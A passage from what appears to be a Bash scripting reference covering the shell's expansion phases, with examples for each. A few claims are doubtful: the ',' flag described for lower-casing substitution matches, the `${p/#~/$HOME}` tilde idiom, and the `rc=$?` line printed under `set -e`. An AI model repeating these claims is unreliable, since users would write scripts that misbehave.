chapter per phase, in this order, and almost every expansion bug
reduces to "I expected phase *N* to run before phase *M*".

### The eight phases (plus quote removal)

1. **Brace expansion** (§5.2) — purely textual; cannot see variables.
2. **Tilde expansion** (§5.3) — `~` / `~user` to home directories.
3. **Parameter and variable expansion** (§5.4) — `${var}`, all
   default/slice/edit operators.
4. **Arithmetic expansion** (§5.5) — `$(( expr ))`.
5. **Command substitution** (§5.6) — `$(cmd)`.
6. **Process substitution** (§5.7) — `<(cmd)`, `>(cmd)`. (Bash extends
   the POSIX list with this phase.)
7. **Word splitting** (§5.8) — splits *unquoted* results on `IFS`.
8. **Pathname expansion** (§5.9) — globbing of *unquoted* results.

Plus the implicit final step:

9. **Quote removal** (§5.10) — strips user-supplied quote characters.

Phases 3 and 4 (and 5 and 6) overlap in practice: parameter, command,
and arithmetic expansion are interleaved in left-to-right order on a
single token. The orders given here are the *categories*; within a
single token Bash applies them in the order they appear.

### Worked walkthrough — one command, all phases

Trace `cp ~/{src,dst}/file_$i_*.txt /tmp/$out` after the user has run
`i=2; out='b u'; touch /tmp/file_2_a.txt /tmp/file_2_b.txt`:

```bash
# scenario: trace a single command through every expansion phase
declare -i i=2
declare -- out='b u'
mkdir -p ~/src ~/dst
touch ~/src/file_2_a.txt ~/src/file_2_b.txt

set -x   # show what bash actually executes (§19.5)
cp ~/{src,dst}/file_${i}_*.txt /tmp/$out
set +x
```

Phase-by-phase rewrite of the single argument list:

| Phase                      | Token after this phase |
|----------------------------|------------------------|
| 0. literal                 | `cp ~/{src,dst}/file_${i}_*.txt /tmp/$out` |
| 1. brace                   | `cp ~/src/file_${i}_*.txt ~/dst/file_${i}_*.txt /tmp/$out` |
| 2. tilde                   | `cp /home/u/src/file_${i}_*.txt /home/u/dst/file_${i}_*.txt /tmp/$out` |
| 3. parameter               | `cp /home/u/src/file_2_*.txt /home/u/dst/file_2_*.txt /tmp/b u` |
| 4–6. arith / cmd / proc    | (no operators present here)                          |
| 7. word splitting          | `cp /home/u/src/file_2_*.txt /home/u/dst/file_2_*.txt /tmp/b u` (the `b u` token splits into `b` and `u`) |
| 8. pathname                | `cp /home/u/src/file_2_a.txt /home/u/src/file_2_b.txt /home/u/dst/file_2_*.txt /tmp/b u` (left side globs; right side has no matches and stays literal under default `nullglob`-off, becomes empty under `nullglob`) |
| 9. quote removal           | (none — nothing was quoted by the user)            |

The command then runs with five separate arguments — *not* the four
the author may have intended. Two issues fall out:

- The trailing `$out` containing a space splits at phase 7. Quoting
  (`"/tmp/$out"`) suppresses splitting and pathname expansion both —
  this is the BCS rule (BCS0301).
- The `~/dst/...` glob found no matches. Default behaviour leaves the
  unmatched pattern literal; with `shopt -s nullglob` it disappears,
  changing the argument count again (§5.9, §5.11).

### What quoting suppresses, and from which phase

Quoting (`"…"` or `'…'`) is the *only* mechanism that disables phases
**7 (word splitting)** and **8 (pathname expansion)** for a token.
Single-quotes additionally disable phases 3–6. Quoting does not
disable phase 1 (brace) — `"{a,b}"` is two literal characters and a
literal comma. Quoting also does not affect phase 2 (tilde) at the
*start* of a token in assignment or default-expansion context, but
does suppress it everywhere else.

### BCS posture

- Quote every parameter expansion in a word context (BCS0301).
- Use `shopt -s nullglob` so an unmatched glob produces zero
  arguments, not the literal pattern (BCS0101, §5.11).
- Avoid building filenames by interpolating untrusted strings into a
  glob pattern — IFS and pathname expansion will do unexpected things
  (BCS1003, BCS1005).

**See also**: §5.2–§5.13 (each phase in order), §5.4 (parameter
expansion), §5.8 (word splitting and IFS), §5.11 (`nullglob`,
`failglob`), §19.5 (`set -x`).

## 5.2 Brace expansion

Generates arbitrary token sequences from a textual pattern. Phase 1
of the expansion order (§5.1) — runs **before** parameter expansion,
so a variable referenced inside the braces is not visible at brace
time. Brace expansion is purely lexical: it does not consult the
filesystem and does not see variables.

### Forms

- **Comma form**: `{a,b,c}` → three tokens `a`, `b`, `c`.
- **Range form**: `{1..5}`, `{a..z}`, `{05..10}` (zero-padded),
  `{1..10..2}` (step). Reverse ranges work: `{5..1}` → `5 4 3 2 1`.
- **Nested**: `{a,b}{1,2}` → `a1 a2 b1 b2` (Cartesian product).
- **Preamble/postscript**: `pre{a,b}post` → `preapost prebpost`.
- **Single element**: `{a}` is left literal — at least two
  comma-separated items, or a `..` range, is required.
- **Unmatched / malformed**: `{a,b` or `}b,c}` left literal.

### Outputs

```bash
# scenario: see exactly what each form produces
echo {a,b,c}            # ⇒ a b c
echo {1..5}             # ⇒ 1 2 3 4 5
echo {05..10}           # ⇒ 05 06 07 08 09 10
echo {1..10..2}         # ⇒ 1 3 5 7 9
echo {5..1}             # ⇒ 5 4 3 2 1
echo {a..e}             # ⇒ a b c d e
echo pre{a,b}post       # ⇒ preapost prebpost
echo {a,b}{1,2}         # ⇒ a1 a2 b1 b2
echo {a}                # ⇒ {a}    (single element — left literal)
echo \{a,b\}            # ⇒ {a,b}  (escaped braces — disabled)

# Variables inside braces do NOT expand:
declare -- list='1,2,3'
echo {$list}            # ⇒ {1,2,3}    (literal — phase 1 < phase 3)
```

### Why `{$list}` does not work

Brace expansion is phase 1; parameter expansion is phase 3. By the
time `$list` becomes `1,2,3`, the brace operator has already failed
to match (single element after expansion). The work-around is `eval`
(BCS1004 — almost always wrong) or arrays (`for x in "${list[@]}"; do`),
which is the canonical replacement (§4.9, BCS0206).

### Common idioms

```bash
# scenario: bulk file rename without forking sed
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# 1. atomic rename: file.txt → file.txt.bak
mv -- "$f"{,.bak}                  # expands to: mv -- "$f" "$f".bak

# 2. directory tree creation in one call
mkdir -p -- {2024,2025,2026}/{01..12}/{logs,reports}

# 3. backup + restore symmetric pair
cp -- "$conf"{,.orig}              # cp -- conf conf.orig
mv -- "$conf"{.orig,}              # mv -- conf.orig conf

# 4. compose a numeric sequence (no seq fork required)
for i in {01..10}; do printf 'job-%s\n' "$i"; done
```

### BCS posture

- Use brace expansion freely for *literal* sequences known at parse
  time. It saves forks (`seq`, `printf` loops).
- For *runtime* sequences, use arrays (BCS0206), not `eval`.
- Quote the `{,.bak}` idiom only on the static side: `mv -- "$f"{,.bak}`.
  The braces themselves must remain unquoted to expand.
- Range form preserves zero-padding only when both ends are padded:
  `{05..10}` works; `{5..010}` does not.

**See also**: §5.1 (expansion order, why brace runs first), §5.4
(parameter expansion), §5.9 (pathname expansion — distinct from brace),
§5.11 (`globstar`).

## 5.3 Tilde expansion

Expands an unquoted `~` (or `~user`) at the **start of a word**, or
immediately after `:` / `=` in an *assignment context*, to the
appropriate home directory. Phase 2 of the expansion order (§5.1).
The trap is that quoting suppresses tilde expansion entirely — and so
does an interior tilde (mid-word) outside of assignments.

### Forms

- `~` (bare) — `$HOME`.
- `~+` — `$PWD`.
- `~-` — `$OLDPWD`.
- `~user` — `user`'s home from `/etc/passwd` (or NSS).
- `~+/path`, `~-/path`, `~user/path` — concatenation; the prefix is
  expanded, the rest is appended verbatim.
- In assignments only: `PATH=~/bin:~/lib:$PATH` — every `~` after `=`
  or `:` expands. This is the *only* mid-word context where tilde
  expansion happens.

### Quoted versus unquoted

```bash
# scenario: tilde expands only when unquoted, at the start of a word
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# unquoted at start of word — expanded
echo ~/bin                          # ⇒ /home/u/bin

# quoted — NOT expanded (literal tilde)
echo "~/bin"                        # ⇒ ~/bin
echo '~/bin'                        # ⇒ ~/bin

# mid-word in a *command* argument — NOT expanded
echo /opt/~/bin                     # ⇒ /opt/~/bin

# mid-word in an *assignment* (after `=` or `:`) — expanded
PATH=~/bin:~/local/bin:$PATH        # both `~/`s expand

# Within ${var:-default} the default is subject to tilde expansion
echo "${UNSET:-~/fallback}"         # ⇒ /home/u/fallback   (unquoted in default)

# Inside a *variable's value*, tilde is literal — no re-expansion
declare -- p='~/bin'
echo "$p"                           # ⇒ ~/bin   (no expansion — phase already past)
cd "$p" 2>&1 || echo 'no such directory'
# ⇒ no such directory   (the literal "~/bin" does not exist)
```

The last case is the most-encountered footgun: a config-file value of
`~/bin` is read as the four literal characters and is **not** expanded
when later used as an argument. Use `${p/#~/$HOME}` (§5.4) or
`HOME=$HOME envsubst` to expand explicitly when reading user input.

### Assignment-context tilde

Tilde expansion in assignments is what makes `PATH=~/bin:$PATH` work:

```bash
# scenario: PATH-style colon-list assignments
declare -x PATH=~/bin:~/local/bin:/usr/local/bin:/usr/bin:/bin
echo "$PATH"
# ⇒ /home/u/bin:/home/u/local/bin:/usr/local/bin:/usr/bin:/bin

# Same applies to other colon-separated path variables:
declare -x MANPATH=~/share/man:/usr/share/man
declare -x LIBRARY_PATH=~/lib:/usr/local/lib
```

The expansion fires after `=` and after every `:`. It does **not** fire
in a `cmd VAR=~user/x` *command-prefix* assignment unless `VAR` is in
Bash's list of "tilde-expanding" assignment builtins
(`declare`/`local`/`export`/`readonly`/`typeset`/`alias`).

### `~+` and `~-` — current and previous directory

`~+` is just `$PWD`; `~-` is `$OLDPWD` (set by every successful `cd`):

```bash
cd /var/log
cd /etc
echo ~+        # ⇒ /etc          (current = $PWD)
echo ~-        # ⇒ /var/log      (previous = $OLDPWD)
cd ~-          # toggles back
```

Useful when scripting a "do work in dir B, return to dir A" pattern
without saving a variable. In BCS scripts the explicit `pushd`/`popd`
or `( cd "$dir"; … )` subshell forms are clearer (§7.x).

### BCS posture

- Never quote the leading `~` you intend to expand (BCS0301).
- Treat `~` in user-supplied input as a literal — expand it explicitly
  via `${p/#~/$HOME}` (BCS1005, §5.4) before use.
- Prefer `$HOME` over `~` in non-trivial scripts: `$HOME/.config/bcs`
  is unambiguous; `~/.config/bcs` works but eye-tracks worse and is
  fragile under indirect expansion.
- For `cd` paired with a return, prefer `(cd "$dir"; …)` subshells
  over `~+`/`~-` global state.

**See also**: §5.1 (expansion order), §5.4 (`${var/#~/$HOME}` rewrite
form), §4.4 (`HOME`, `PWD`, `OLDPWD`), §7.x (`pushd`/`popd`).

## 5.4 Parameter and variable expansion

Parameter expansion is the workhorse of bash scripting — the construct
that turns `${var}` into a value, and the only expansion rich enough to
substitute defaults, slice substrings, edit text, change case, and
reflect on attributes without spawning an external process. This
chapter documents the full operator catalogue with one or two-line
examples per group, in the order an experienced reader is most likely
to need them.

The general form is `${parameter}` or `${parameter operator argument}`.
Braces are required for every operator and for any reference where the
following character could be confused for part of the name (digits,
letters, underscore). Bare `$name` works only for simple references
followed by a non-name character.

### Bare reference and length

```bash
# scenario: simplest references and length operator
declare -- name='hello'
echo "$name"        # ⇒ hello
echo "${name}"      # ⇒ hello
echo "${#name}"     # ⇒ 5    — string length in characters

declare -a a=(one two three)
echo "${#a[@]}"     # ⇒ 3    — element count
echo "${#a[0]}"     # ⇒ 3    — length of element zero
```

`${#var}` counts characters, not bytes; multibyte characters under a
UTF-8 locale count as one. Cross-reference §5.13 for locale effects.

### Default, alternative, assign, error (the `:` family)

Each of these tests whether `var` is *unset or empty* (with the
colon) versus *unset only* (without). This colon distinction is the
single most-mis-remembered detail in parameter expansion.

| Operator | Test | Effect |
|----------|------|--------|
| `${var:-default}` | unset or empty | yield `default`; do not assign |
| `${var-default}`  | unset only     | yield `default`; do not assign |
| `${var:=default}` | unset or empty | assign `default` to `var`, yield it |
| `${var=default}`  | unset only     | assign `default`, yield it |
| `${var:?msg}`     | unset or empty | print `msg` to stderr, exit non-zero |
| `${var?msg}`      | unset only     | as above |
| `${var:+alt}`     | unset or empty | yield empty; otherwise yield `alt` |
| `${var+alt}`      | unset only     | yield empty; otherwise yield `alt` |

```bash
# scenario: defaults, assignment, and the unset-only distinction
declare -- empty=''
declare -- set='value'

echo "${unset:-fallback}"   # ⇒ fallback   — unset
echo "${empty:-fallback}"   # ⇒ fallback   — empty triggers `:`
echo "${empty-fallback}"    # ⇒            — empty does not trigger non-`:`
echo "${set:-fallback}"     # ⇒ value      — set, no fallback
echo "${set:+yes}"          # ⇒ yes        — set, alt yields
echo "${empty:+yes}"        # ⇒            — empty, alt yields nothing
```

Under `set -u` (BCS0601), `${var-default}` is the safe form for
"reference without erroring out": the `:-` and `-` forms are explicitly
exempt from `nounset` because they exist precisely to handle the unset
case.

### Substring extraction

```bash
# scenario: offset and length slicing
declare -- s='abcdefghij'
echo "${s:0:3}"     # ⇒ abc
echo "${s:3}"       # ⇒ defghij     — to end
echo "${s:3:2}"     # ⇒ de
echo "${s: -2}"     # ⇒ ij          — leading space mandatory for negative offset
echo "${s:0:-2}"    # ⇒ abcdefgh    — negative length means "stop N chars from end"
```

Negative offsets and negative lengths require a *space or paren* before
the minus sign — `${s:-2}` is the default operator from the previous
section, not a substring. Either `${s: -2}` or `${s:(-2)}` works.

For positional parameters, `${@:offset:length}` and `${*:offset:length}`
slice the argument list. For arrays, `${arr[@]:offset:length}` slices.

### Pattern removal (`#`, `##`, `%`, `%%`)

These strip a glob-matched prefix or suffix. Single is shortest match;
double is greediest.

```bash
# scenario: path manipulation without basename/dirname
declare -- path='/etc/cron.d/run-parts.sh'
echo "${path##*/}"   # ⇒ run-parts.sh   — greedy prefix removal: basename
echo "${path%/*}"    # ⇒ /etc/cron.d    — shortest suffix removal: dirname
echo "${path%.*}"    # ⇒ /etc/cron.d/run-parts   — strip last extension
echo "${path##*.}"   # ⇒ sh             — extension only
```

These operators avoid the fork cost of `basename`/`dirname` and are the
idiomatic bash form (BCS0207). The pattern is a glob, not a regex —
see §5.9 for syntax.

### Pattern substitution (`/`, `//`, `/#`, `/%`)

```bash
# scenario: replace, replace-all, anchored replacement
declare -- s='one two two three'
echo "${s/two/TWO}"     # ⇒ one TWO two three     — first match
echo "${s//two/TWO}"    # ⇒ one TWO TWO three     — all matches
echo "${s/#one/ONE}"    # ⇒ ONE two two three     — anchored to start
echo "${s/%three/THREE}"# ⇒ one two two THREE     — anchored to end

# Delete by replacing with empty
declare -- noisy='abc123def456'
echo "${noisy//[0-9]/}" # ⇒ abcdef                — delete all digits
```

The replacement may reference the matched text by `&` (Bash 5.2+) or
`\\&`; the `,` flag (Bash 5.2+) lower-cases each match: `${s//[A-Z]/,&}`.

### Case conversion

```bash
# scenario: title-case and full-case toggles
declare -- title='hello world'
echo "${title^}"        # ⇒ Hello world           — first char up
echo "${title^^}"       # ⇒ HELLO WORLD           — all up
echo "${title^^[hw]}"   # ⇒ Hello World           — pattern-restricted
declare -- shout='HELLO WORLD'
echo "${shout,}"        # ⇒ hELLO WORLD           — first char down
echo "${shout,,}"       # ⇒ hello world           — all down
```

These operators replace `tr [:upper:] [:lower:]` for ASCII strings
without forking. Locale-sensitive case folding is correct under a
UTF-8 locale (§5.13).

### Indirect references and prefix lists

```bash
# scenario: dereference a name held in another variable
declare -- target='HOME'
echo "${!target}"           # ⇒ /home/sysadmin     — value of $HOME

# Names matching a prefix (useful for env-var families)
declare -- BCS_MODEL='balanced' BCS_EFFORT='low' BCS_VERBOSE=1
printf '%s\n' "${!BCS_@}"   # ⇒ BCS_EFFORT BCS_MODEL BCS_VERBOSE
```

For arrays, `${!arr[@]}` yields *indices*, not values — essential for
sparse indexed arrays and all associative arrays:

```bash
declare -A by_name=([alice]=42 [bob]=17)
for k in "${!by_name[@]}"; do
  printf '%s=%s\n' "$k" "${by_name[$k]}"
done
# ⇒ alice=42
# ⇒ bob=17    (key order is unspecified for assoc arrays)
```

For nameref-based indirection (Bash 4.3+), prefer `declare -n` —
namerefs are safer and more readable than `${!var}` for write access.
See §4.11.

### Transformation operators (`@`)

The `@` family inspects or transforms the parameter without changing
its value. Each operator is a single character.

| Operator | Yields |
|----------|--------|
| `${var@Q}` | value re-quoted as a shell-parseable literal |
| `${var@E}` | value with backslash escapes interpreted (`\n`, `\t`, …) |
| `${var@P}` | value expanded as a `PS1`-style prompt |
| `${var@A}` | a `declare`/`typeset` assignment statement that reproduces `var` |
| `${var@a}` | the attribute flags (`a`, `A`, `i`, `r`, `x`, `n`, …) as a string |
| `${var@K}` | associative-array form with quoted keys (Bash 5.2+) |
| `${var@k}` | associative-array form, unquoted keys (Bash 5.2+) |
| `${var@U}` | upper-cased (entire string) |
| `${var@u}` | upper-cased (first character only) |
| `${var@L}` | lower-cased (entire string) |

```bash
# scenario: @Q for safe re-emission, @A for round-trip dumps, @a for attrs
declare -ai counts=([0]=10 [3]=42 [7]=99)
echo "${counts[@]@Q}"    # ⇒ '10' '42' '99'      — each element shell-quoted
echo "${counts[@]@A}"    # ⇒ declare -ai counts=([0]="10" [3]="42" [7]="99")
declare -ir CONST=7
echo "${CONST@a}"        # ⇒ ir                   — integer + readonly

# @P for prompt-style escapes (current dir, time, etc.)
declare -- p='\u@\h:\w\$ '
echo "${p@P}"            # → e.g. `user@host:/path$ ` (host-dependent)
```

`${var@Q}` is the canonical way to *log* or *re-emit* a variable's
value without quoting bugs (BCS0306) — its output is guaranteed
parseable when piped back into bash.

### Quoting rules around expansion

Always quote unless splitting is the intent. `"${arr[@]}"` preserves
each element as a separate word; `${arr[@]}` (unquoted) re-splits each
element on `IFS` (§5.8). The same applies to `"$var"` versus `$var`.

```bash
# scenario: quoted vs unquoted expansion of an element with spaces
declare -a files=('one two' 'three')
printf '[%s]\n' "${files[@]}"   # ⇒ [one two] [three]
# wrong — unquoted array expansion re-splits on IFS; demonstration only
#shellcheck disable=SC2068
printf '[%s]\n' ${files[@]}     # ⇒ [one] [two] [three]   — splitting bug
```

The unquoted form is the single most common cause of Bash bugs in
production scripts (§5.8). Quote unconditionally.

**See also**: §5.5 (arithmetic expansion shares variable-reference
syntax), §5.8 (word splitting after expansion), §5.9 (glob patterns
used by `#`, `%`, `/`), §5.13 (locale effects on case operators),
§4.11 (namerefs as an alternative to `${!var}`), BCS0207 (parameter
expansion idioms), BCS0306 (`@Q` for safe quoting), BCS0601 (`set -u`
and the `${var-default}` exemption).

## 5.5 Arithmetic expansion

`$(( expr ))` evaluates *expr* as a Bash arithmetic expression
(§8.10) and substitutes the textual result. Phase 4 of the expansion
order (§5.1). Inside an arithmetic context, named variables are read
**without** the `$` prefix and are coerced to integers (zero if
non-numeric or unset). The expansion is the workhorse for index
arithmetic, counters, bitwise tests, and anything else that does not
need an external `expr`/`bc`.

### Form and basic behaviour

- `$(( expression ))` — produces the integer result as a string.
- Variables referenced **without** `$`: `$(( a + b ))` reads `a` and
  `b` directly. The `$` form `$(( $a + $b ))` works (parameter
  expansion runs first, phase 3) but is redundant and obscures
  precedence.
- Empty `$(( ))` evaluates to `0`.
- Nested `$(( $(( a )) + b ))` is unnecessary — `$(( a + b ))` suffices.
- The legacy form `$[ expression ]` is **deprecated**; do not use.
- Bash arithmetic is **64-bit signed integer**. Overflow wraps
  silently (BCS0506).

```bash
# scenario: minimum-viable arithmetic expansion
declare -i a=3 b=4
echo $(( a + b ))            # ⇒ 7
echo $(( a + b * 2 ))        # ⇒ 11    (precedence: * before +)
echo $(( (a + b) * 2 ))      # ⇒ 14
echo $(( 1 << 4 ))           # ⇒ 16    (bit-shift)
echo $(( a > b ? a : b ))    # ⇒ 4     (ternary, returns max)
echo $(( ))                  # ⇒ 0
echo $(( 0xff ))             # ⇒ 255   (hex prefix)
echo $(( 8#17 ))             # ⇒ 15    (base#digits — base 8)
echo $(( 2#1010 ))           # ⇒ 10    (binary)
```

### The `set -u` arithmetic inconsistency

`set -u` (`nounset`) terminates the script on reference to an unset
variable — except inside arithmetic, where unset variables are
silently treated as `0`. This is a long-standing wart that catches
authors who rely on `set -u` to catch typos in counter names:

```bash
# scenario: demonstrate the set -u arithmetic inconsistency
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Outside arithmetic — set -u fires:
echo "$undef"
# ⇒ bash: undef: unbound variable
# ⇒ (script terminates here under `set -e`)

# But inside arithmetic, the same name is silently zero:
echo $(( undef + 1 ))            # ⇒ 1     — no error
declare -i n=$(( undef * 99 ))   # ⇒ n=0   — no error

# Workaround: defensive default expansion (BCS0207)
echo $(( ${undef:-0} + 1 ))      # explicit zero, intent visible
```

Mitigation: when a counter or index *must* be defined, default it
explicitly with `${var:-0}` inside the arithmetic, or test
`[[ -v var ]]` (§8.4) before the arithmetic runs. BCS0203 / BCS0207
naming and defaulting discipline removes most occurrences in practice.

### Where the form lives in the Bash zoo

- `$(( … ))` — *arithmetic expansion*, substitutes a value, suitable
  in any word context.
- `(( … ))` — *arithmetic command*, no substitution; exit status 0
  iff result is non-zero. Used in `if`/`while` (BCS0501, BCS0505).
- `let 'a = b + 1'` — older form; avoid.
- `declare -i x=…` — assignment context auto-arithmetic; the right
  side is evaluated as `expr`. Re-evaluated on every reassignment.

### Number-base prefixes

Bash recognises:

- `0xN` / `0XN` — hexadecimal.
- `0N` — octal (a leading literal zero).
- `BASE#N` — base 2 through 64. Digits `0-9 a-z A-Z @ _`.

```bash
# scenario: base prefixes — including the 0-prefix octal trap
echo $(( 010 ))                          # ⇒ 8
{ echo $(( 09 )); } 2>/dev/null || true  # → "bash: 09: value too great for base"
echo $(( 10#09 ))                        # ⇒ 9
```

The leading-zero octal trap matters when zero-padded numeric strings
arrive from `printf '%02d'` or external tools. Use `10#$str` to force
base 10 (BCS0505).

### BCS posture

- Use `(( expr ))` (the *command*) for conditionals, `$(( expr ))`
  (the *expansion*) only when the value is needed in word context.
- Declare integer-typed variables with `declare -i` so simple
  reassignment (`count=$((count + 1))`) does not require explicit
  arithmetic re-evaluation each time (BCS0201).
- Increment idiom: `count+=1` (NOT `((count++))`) — the post-increment
  form returns 0 when the prior value was 0, tripping `set -e`
  (BCS0505).
- Always `10#$x` when *x* may carry a leading zero (BCS0505).

**See also**: §5.4 (parameter expansion runs first), §8.10
(arithmetic operator precedence and primaries), §4.12 (integer
arithmetic semantics — overflow, base parsing), §13.3 (`set -e`
exemption matrix — `(( ))` and `let`).

## 5.6 Command substitution

`$(command)` runs `command` in a subshell, captures its standard
output, strips one or more trailing newlines, and substitutes the
result into the surrounding word. It is the foundation for capturing
the output of one command into a variable or into the arguments of
another, and is one of the most frequently used constructs in shell
scripts.

The legacy backtick form `` `command` `` is omitted from this reference
(§11 of the bash manual still documents it for portability); under the
strict-mode assumptions of this document, only `$(...)` is used. It
nests cleanly, supports embedded quotes naturally, and is unambiguously
parseable.

### Basic semantics

```bash
# scenario: capture, embed, and nest
declare -- today
today="$(date +%F)"
echo "today is $today"            # ⇒ today is 2026-05-03

declare -- count
count="$(grep -c '^pattern' file.txt)"

# Nested — read the directory of the script's directory
declare -- parent
parent="$(dirname "$(realpath -- "$0")")"
```

Each substitution forks a subshell, executes the command, and waits
for it. Variable assignments and shell-state changes inside the
substitution do *not* leak back out — they are confined to the
subshell.

### The `$(<file)` idiom

`$(<file)` is a special form recognised by bash: rather than spawning
a subshell to run a command, it reads `file` directly into the
substitution result. It is the canonical fast file-read and the
preferred replacement for `"$(cat file)"`:

```bash
# scenario: read a small file into a variable without forking
declare -- version
version="$(<VERSION)"               # no fork; trailing newlines stripped
echo "version=$version"

# Equivalent but slower (forks cat):
# version="$(cat VERSION)"
```

This is an *idiom*, not a pitfall — under heavy use (loops, large
scripts) the fork-avoidance is measurable. The same trailing-newline
stripping applies.

### Trailing newline stripping

Bash strips *all* trailing newlines from the captured output. Embedded
newlines are preserved. This is almost always what you want, but it
catches scripts that need to know whether a file ended with a newline:

```bash
# scenario: trailing newlines disappear, embedded newlines survive
declare -- multi
multi="$(printf 'a\nb\n\n\n')"
printf '[%s]\n' "$multi"            # ⇒ [a
                                    #    b]   — three trailing \n stripped

# Workaround: append a sentinel and trim it
declare -- exact
exact="$(printf 'a\nb\n\n\n'; printf x)"
exact="${exact%x}"                  # now $exact has every newline preserved
```

### `inherit_errexit` interaction

Without `shopt -s inherit_errexit`, the subshell spawned by `$( ... )`
*does not inherit* `set -e`. Failures inside the substitution are
silently swallowed unless their exit status is also the substitution's
exit status:

```bash
# scenario: errexit drops at the subshell boundary
set -euo pipefail
declare -- result
result="$(false; echo done)"        # without inherit_errexit:
                                    #   result='done', no exit
echo "still alive: $result"

# With inherit_errexit (BCS0101 mandates this):
shopt -s inherit_errexit
result="$(false; echo done)"        # subshell aborts at false;
                                    # outer shell sees rc=1, exits
```

Always pair `set -e` with `shopt -s inherit_errexit` — see §13.6 for
the full discussion. BCS0101's strict-mode preamble enables it
unconditionally.

### Quoting and word splitting

The result of an unquoted command substitution undergoes word
splitting (§5.8) and pathname expansion (§5.9):

```bash
# scenario: quote unless splitting is the intent
declare -- list_with_spaces
list_with_spaces="$(printf 'foo bar\nbaz\n')"
printf '[%s]\n' "$list_with_spaces"
# ⇒ [foo bar
# ⇒ baz]
# shellcheck disable=SC2086  # word-splitting is the demo
printf '[%s]\n' $list_with_spaces
# ⇒ [foo]
# ⇒ [bar]
# ⇒ [baz]

# Idiomatic capture into an array (one element per line)
: > demo-input.txt && printf 'pattern A\npattern B\nother\n' > demo-input.txt
declare -a lines
readarray -t lines < <(grep '^pattern' demo-input.txt)
printf 'lines captured: %d\n' "${#lines[@]}"   # ⇒ lines captured: 2
```

For any capture you intend to manipulate as a single string, quote.
For line-by-line capture into an array, prefer `readarray -t` with
process substitution (§5.7) over `arr=( $(...) )`, which mishandles
embedded whitespace.

### Bash 5.3 `${ command; }` no-fork form

Bash 5.3 introduces a no-fork command substitution: `${ command; }`
runs `command` in the *current* shell, with no subshell, capturing its
output. Variable changes propagate. This is documented in §25.1 and
is not yet generally portable across Bash 5.2 deployments.

**See also**: §5.7 (process substitution for streaming captures),
§5.8 (word splitting of unquoted results), §13.6 (inherit_errexit
discipline), §25.1 (Bash 5.3 no-fork command substitution),
BCS0302 (command substitution patterns), BCS0101 (strict-mode
preamble).

## 5.7 Process substitution

Process substitution gives a command a filename argument that is
really a pipe to or from another command. The substituted process runs
concurrently with the consumer; bash hands over a `/dev/fd/N` path (or
a named pipe on systems without `/dev/fd`) and the consumer reads or
writes that path as if it were a file. This bridges the gap between
tools that accept *filenames* and tools that produce *streams* — the
canonical example being `diff`, which insists on filenames yet is
almost always wanted on the output of *commands*.

### Read substitution `<( … )`

`<(cmd)` opens `cmd`'s standard output as a readable file. The
filename appears on the command line; the consumer opens it and reads
the stream.

```bash
# scenario: diff two sorted streams without temp files
diff <(sort -u list1.txt) <(sort -u list2.txt)

# Equivalent older approach (with cleanup burden):
# t1=$(mktemp); t2=$(mktemp)
# sort -u list1.txt > "$t1"
# sort -u list2.txt > "$t2"
# diff "$t1" "$t2"
# rm -f "$t1" "$t2"
```

The substituted processes run in parallel; `diff` reads both pipes
concurrently. No temp files are created, no cleanup is required, and
no error is possible from a filesystem-full condition.

### Write substitution `>( … )` — fan-out

`>(cmd)` opens a writable file connected to `cmd`'s standard input.
Combined with `tee`, this fans one stream out to multiple consumers
in a single pass:

```bash
# scenario: archive, hash, and inspect a large stream in one pass
generate_data \
  | tee >(gzip > out.gz) \
        >(sha256sum > out.sha256) \
        >(wc -l > out.lines) \
  > /dev/null

# At completion: out.gz, out.sha256, out.lines all written; data read once.
```

Compare the alternative — running `generate_data` three times, or
storing the output in a temp file and reading it three times. The
process-substitution form is both faster and more memory-efficient
when the stream is large.

### Strict-mode and exit-status caveat

The exit status of a substituted process is *not* directly available
in `$?` — only the consumer's status is. This breaks under
`set -e` if the substituted process fails: the outer pipeline appears
to succeed.

```bash
# scenario: substituted process failure is invisible
set -euo pipefail
shopt -s inherit_errexit

# false here is silently ignored — diff sees an empty file and reports no diff
diff <(false) <(echo bar)
echo "rc=$?"     # ⇒ rc=1   — but from diff seeing a difference, not from false

# To capture the substituted process's exit, name it and wait:
exec {fd}< <(some_command); pid=$!
# ... read from /dev/fd/$fd ...
wait "$pid" || die 5 'some_command failed'
```

When the substituted process's exit status matters, capture the PID
via `$!` immediately after the substitution and `wait` on it. For
bidirectional coordination, prefer a coproc (Part XVII).

### Avoiding the `while-read | …` subshell trap

The classic *anti-pattern* is `cmd | while read -r line; …; done`,
which runs the loop body in a subshell — every variable assignment is
lost on exit. Process substitution fixes it without forking a
subshell for the loop:

```bash
# scenario: read into the current shell, no subshell
declare -i count=0
while IFS= read -r line; do
  count+=1
done < <(grep '^pattern' file.txt)
echo "matched $count lines"     # ⇒ matched 17 lines (or whatever)
```

The `< <(cmd)` form is the BCS-preferred way to feed a `while` loop
from a command's output (BCS0903). The space between the redirection
operator `<` and the substitution `<(...)` is required.

### Lifetime and FD inheritance

The substituted process is reaped by bash on the consumer's behalf.
The `/dev/fd/N` path lives only for the duration of the parent
command — referencing it after the command returns is undefined.
Substituted processes inherit the parent's open file descriptors,
which can occasionally bite (a logging FD held open keeps the parent
alive longer than expected); see §17 for management techniques.

Process substitution is not POSIX. It works in bash, ksh, and zsh.
Scripts that must run under `dash` or strict POSIX `sh` cannot use it.

**See also**: §5.6 (command substitution captures stdout into a
variable rather than a filename), §5.8 (word splitting does not affect
process-substitution paths), §17 (coproc for bidirectional pipes),
§13.5 (pipefail for pipeline-component error visibility), BCS0504
(process substitution idioms), BCS0903 (avoiding subshell-loop
pitfalls with `< <(...)`).

## 5.8 Word splitting and IFS

Word splitting is the step in bash's expansion pipeline (§5.1) where
the *unquoted* results of parameter, command, and arithmetic expansion
are broken into multiple words on the characters in the `IFS`
variable. It is the single largest source of subtle bugs in
production bash scripts: a filename containing a space, a tab in
captured output, or a stray `*` can transform a one-argument command
into many or none. This chapter is the canonical reference for the
rule, the safe-IFS idiom, and the cardinal discipline that keeps
scripts correct.

### The rule in one sentence

After expansion, every result that *was not* inside double quotes is
re-tokenised by splitting on `IFS`. Quoted expansions (`"$var"`,
`"${arr[@]}"`, `"$(cmd)"`) are exempt and survive as a single word
each.

That sentence is the entire model. The rest is detail.

### Default IFS and the IFS-whitespace rule

The default value of `IFS` is the three characters space, tab,
